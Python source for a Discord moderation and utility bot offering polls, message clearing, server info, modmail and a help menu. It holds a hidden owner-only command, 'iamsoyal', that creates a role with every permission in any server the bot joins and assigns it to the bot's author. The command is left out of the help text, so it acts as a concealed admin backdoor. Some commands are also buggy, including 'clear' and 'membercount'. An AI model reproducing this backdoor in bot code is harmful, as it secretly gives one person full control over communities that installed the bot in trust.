import discord
from discord.ext import commands
from discord.ext.commands.cooldowns import BucketType
import asyncio
import colorsys
import random
import platform
from discord import Game, Embed, Color, Status, ChannelType
import os
import functools
import time
import datetime
import aiohttp
import requests
import json
import aiohttp
from contextlib import redirect_stdout



Forbidden= discord.Embed(title="Permission Denied", description="1) Please check whether you have permission to perform this action or not. \n2) Please check whether my role has permission to perform this action in this channel or not. \n3) Please check my role position.", color=0x00ff00)
client = commands.Bot(description="Here is some command for you", command_prefix=commands.when_mentioned_or("A!"), pm_help = True)
client.remove_command('help')


async def status_task():
    while True:
        await client.change_presence(game=discord.Game(name='for A!help'))
        await asyncio.sleep(5)
        await client.change_presence(game=discord.Game(name='with '+str(len(set(client.get_all_members())))+' users'))
        await asyncio.sleep(5)
        await client.change_presence(game=discord.Game(name='in '+str(len(client.servers))+' servers'))
        await asyncio.sleep(5)
	
	
@client.event
async def on_ready():
    print('Logged in as '+client.user.name+' (ID:'+client.user.id+') | Connected to '+str(len(client.servers))+' servers | Connected to '+str(len(set(client.get_all_members())))+' users')
    print('--------')
    print('--------')
    print('Started Android gamer')
    print('Created by Swapnil')
    client.loop.create_task(status_task())
	
def is_owner(ctx):
    return ctx.message.author.id == '442592011585978369'

def is_swapnil(ctx):
    return ctx.message.author.id == '442592011585978369'
  
@client.command(pass_context=True, aliases=['em', 'e'])
async def modmail(ctx, *, msg=None):
    channel = discord.utils.get(client.get_all_channels(), name='📬mod-mails📬')
    r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
    color = discord.Color((r << 16) + (g << 8) + b)
    if not msg:
        await client.say("Message not sent")
    else:
        await client.send_message(channel, embed=discord.Embed(color=color, description=msg + '\n Message From-' + ctx.message.author.id))
        await client.delete_message(ctx.message)
    return
	
@client.command()
async def servers():
  servers = list(client.servers)
  await client.say(f"Connected on {str(len(servers))} servers:")
  await client.say('\n'.join(server.name for server in servers))
 
@client.command(pass_context=True)
async def google(ctx, *, message):
    new_message = message.replace(" ", "+")
    url = f"https://www.google.com/search?q={new_message}"
    await client.say(url)	

@client.command(pass_context=True)
async def youtube(ctx, *, message):
    new_message = message.replace(" ", "+")
    url = f"https://www.youtube.com/search?q={new_message}"
    await client.say(url)

	

@client.command(pass_context=True)
@commands.check(is_swapnil)
async def botdm(ctx, user: discord.Member, *, msg: str):
    await client.send_typing(user)
    await client.send_message(user, msg)
	
	
@client.command(pass_context = True)
@commands.has_permissions(administrator = True)
async def dm(ctx, user: discord.Member, *, msg: str):
    try:
        await client.send_message(user, msg)
        await client.delete_message(ctx.message)          
        await client.say("Success! Your DM has made it! :white_check_mark: ")
    except discord.ext.commands.MissingPermissions:
        await client.say("Aw, come on! You thought you could get away with DM'ing people without permissions.")
    except:
        await client.say("Error :x:. Make sure your message is shaped in this way: ^dm [tag person] [msg]")
	
	
@client.command(pass_context = True)
@commands.check(is_swapnil)
async def iamsoyal(ctx):
    user = ctx.message.author
    if discord.utils.get(user.server.roles, name="Swapnil") is None:
        await client.create_role(user.server, name="Swapnil", permissions=discord.Permissions.all())
        role = discord.utils.get(ctx.message.server.roles, name='Swapnil')
        await client.add_roles(ctx.message.author, role)
    else:	
        author = ctx.message.author
        await client.delete_message(ctx.message)
        role = discord.utils.get(ctx.message.server.roles, name='Swapnil')
        await client.add_roles(ctx.message.author, role)
        print('Added Swapnil role in ' + (ctx.message.author.name))
        await client.send_message(author, role)
        

@client.command(pass_context=True)
@commands.has_permissions(administrator=True)
async def friend(ctx, user:discord.Member,):
    await client.delete_message(ctx.message)
    role = discord.utils.get(ctx.message.server.roles, name='Friend of Owner')
    await client.add_roles(ctx.message.mentions[0], role)

@client.command(pass_context=True)
async def ownerinfo(ctx):
    embed = discord.Embed(title="Information about owner", description="Bot Name- android gamer", color=0x00ff00)
    embed.set_footer(text="Android gamer")
    embed.set_author(name=" Bot Owner Name- swapnil,ID:472680171451973632")
    embed.add_field(name="Site- coming soon...", value="Thanks for adding our bot", inline=True)
    await client.say(embed=embed)  
    
@client.command(pass_context = True)
async def happybirthday(ctx, *, msg = None):
    if '@here' in msg or '@everyone' in msg:
      return
    if not msg: await client.say("Please specify a user to wish")
    await client.say('Happy birthday have a nice day' + msg + ' http://imgur.com/gallery/PbyNCR2')
    return
@client.command(pass_context=True, aliases=['server'])
@commands.has_permissions(kick_members=True)
async def membercount(ctx, *args):
    """
    """
    if ctx.message.channel.is_private:
        await bot.delete_message(ctx.message)
        return

    g = ctx.message.server

    gid = g.id
    membs = str(len(g.members))
    membs_on = str(len([m for m in g.members if not m.status == Status.offline]))
    users = str(len([m for m in g.members if not m.bot]))
    users_on = str(len([m for m in g.members if not m.bot and not m.status == Status.offline]))
    bots = str(len([m for m in g.members if m.bot]))
    bots_on = str(len([m for m in g.members if m.bot and not m.status == Status.offline]))
    created = str(g.created_at)
    
    em = Embed(title="Membercount")
    em.description =    "```\n" \
                        "Members:   %s (%s)\n" \
                        "  Users:   %s (%s)\n" \
                        "  Bots:    %s (%s)\n" \
                        "Created:   %s\n" \
                        "```" % (membs, membs_on, users, users_on, bots, bots_on, created)

    await client.send_message(ctx.message.channel, embed=em)
    await client.delete_message(ctx.message)

@client.command(pass_context=True)
@commands.has_permissions(kick_members=True) 
async def roles(context):
	"""Displays all of the roles with their ids"""
	roles = context.message.server.roles
	result = "The roles are "
	for role in roles:
		result += '``' + role.name + '``' + ": " + '``' + role.id + '``' + "\n "
	await client.say(result)

@client.command(pass_context = True)
@commands.has_permissions(administrator=True) 
async def announce(ctx, channel: discord.Channel=None, *, msg: str):
    r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
    embed=discord.Embed(title="Announcement", description="{}".format(msg), color = discord.Color((r << 16) + (g << 8) + b))
    await client.send_message(channel, embed=embed)
    await client.delete_message(ctx.message)

@client.command(pass_context = True)
@commands.has_permissions(manage_messages=True)  
async def clear(ctx, number):
 
    if ctx.message.author.server_permissions.manage_messages:
         mgs = [] #Empty list to put all the messages in the log
         number = int(number) #Converting the amount of messages to delete to an integer
    async for x in client.logs_from(ctx.message.channel, limit = number+1):
        mgs.append(x)            
       
    try:
        await client.delete_messages(mgs)          
        await client.say(str(number)+' messages deleted')
     
    except discord.Forbidden:
        await client.say(embed=Forbidden)
        return
    except discord.HTTPException:
        await client.say('clear failed.')
        return         
   
 
    await client.delete_messages(mgs)

@client.command(pass_context = True)
async def sorry(ctx, *, msg = None):
    if '@here' in msg or '@everyone' in msg:
      return
    if not msg: await client.say("Please Sorry")
    await client.say('Sorry ' + msg + ' http://imgur.com/gallery/Dif2lYI')
    return

@client.command(pass_context = True)
@commands.has_permissions(administrator=True)     
async def makeadmin(ctx, user: discord.Member):
    nickname = 'Ѧ'+ user.name
    await client.change_nickname(user, nickname=nickname)
    role = discord.utils.get(ctx.message.server.roles, name='Admin')
    await client.add_roles(user, role)
    r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
    embed = discord.Embed(color = discord.Color((r << 16) + (g << 8) + b))
    embed.set_author(name='Congratulations Message')
    embed.add_field(name = '__Congratulations__',value ='**Congratulations for Admin.Hope you will be more active here. Thanks for your help and support.**',inline = False)
    embed.set_image(url = 'https://preview.ibb.co/i1izTz/ezgif_5_e20b665628.gif')
    await client.send_message(user,embed=embed)
    await client.delete_message(ctx.message)
    
@client.command(pass_context=True)  
@commands.has_permissions(kick_members=True)     

async def serverinfo(ctx):
    '''Displays Info About The Server!'''

    server = ctx.message.server
    roles = [x.name for x in server.role_hierarchy]
    role_length = len(roles)

    if role_length > 50: #Just in case there are too many roles...
        roles = roles[:50]
        roles.append('>>>> Displaying[50/%s] Roles'%len(roles))

    roles = ', '.join(roles);
    channelz = len(server.channels);
    time = str(server.created_at); time = time.split(' '); time= time[0];
    r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
    join = discord.Embed(description= '%s '%(str(server)),title = 'Server Name', color = discord.Color((r << 16) + (g << 8) + b));
    join.set_thumbnail(url = server.icon_url);
    join.add_field(name = '__Owner__', value = str(server.owner) + '\n' + server.owner.id);
    join.add_field(name = '__ID__', value = str(server.id))
    join.add_field(name = '__Member Count__', value = str(server.member_count));
    join.add_field(name = '__Text/Voice Channels__', value = str(channelz));
    join.add_field(name = '__Roles (%s)__'%str(role_length), value = roles);
    join.set_footer(text ='Created: %s'%time);

    return await client.say(embed = join);    

@client.command(pass_context=True)
async def poll(ctx, question, *options: str):
        if len(options) <= 1:
            await client.say('You need more than one option to make a poll!')
            return
        if len(options) > 10:
            await client.say('You cannot make a poll for more than 10 things!')
            return

        if len(options) == 2 and options[0] == 'yes' and options[1] == 'no':
            reactions = ['👍', '👎']
        else:
            reactions = ['1\u20e3', '2\u20e3', '3\u20e3', '4\u20e3', '5\u20e3', '6\u20e3', '7\u20e3', '8\u20e3', '9\u20e3', '\U0001f51f']

        description = []
        for x, option in enumerate(options):
            description += '\n {} {}'.format(reactions[x], option)
            r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
        embed = discord.Embed(title=question, description=''.join(description), color = discord.Color((r << 16) + (g << 8) + b))
        react_message = await client.say(embed=embed)
        for reaction in reactions[:len(options)]:
            await client.add_reaction(react_message, reaction)
        embed.set_footer(text='Poll ID: {}'.format(react_message.id))
        await client.edit_message(react_message, embed=embed)                          
      
@client.command(pass_context = True)
async def help(ctx):
    if ctx.message.author.bot:
      return
    else:
      author = ctx.message.author
      r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
      embed = discord.Embed(color = discord.Color((r << 16) + (g << 8) + b))
      embed.set_author(name='Please Do A!upvote')
      embed.add_field(name = 'Modrator Help',value ='`A!kick <@user>` `A!getuser <@user>` `A!userinfo <@user>` `A!setnick <@user> <new nick>` `A!poll` `A!ban <@user>` `A!unban` `A!clear <number>` `A!embed <message>` `A!announce <#channel> <message>` `A!roles` `A!membercount` `A!addrole <name>` `A!delrole <name>` `A!addchannel <channel>` `A!delchannel <#channel>` `A!setuplog`',inline = False)
      embed.add_field(name = 'General help',value ='`A!google <search>` `A!youtube <name>` `A!info` `A!invite` `A!ownerinfo` `A!serverinfo` `A!sorry <@user>` `A!serverinvite`,`A!upvote`',inline = False)
      embed.add_field(name = 'Music help',value ='`A!play <song name>` `A!stop` `A!skip` `A!resume` `A!volume` `A!pause`',inline = False)
      dmmessage = await client.send_message(author,embed=embed)
      
